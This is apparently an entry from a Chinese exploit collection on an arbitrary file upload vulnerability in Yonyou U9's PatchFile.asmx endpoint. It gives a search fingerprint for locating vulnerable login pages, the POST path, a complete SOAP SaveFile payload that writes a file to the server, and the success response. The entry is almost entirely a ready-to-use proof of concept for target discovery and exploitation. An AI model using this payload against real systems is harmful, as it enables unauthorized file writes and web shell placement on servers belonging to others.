# 用友U9PatchFile.asmx任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`title=="U9-登录"`
- **请求**：`POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SaveFile xmlns="http://tempuri.org/">
<binData>MTIzNDU2</binData>
<path>./</path>
<fileName>dudesite.txt</fileName>
</SaveFile>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200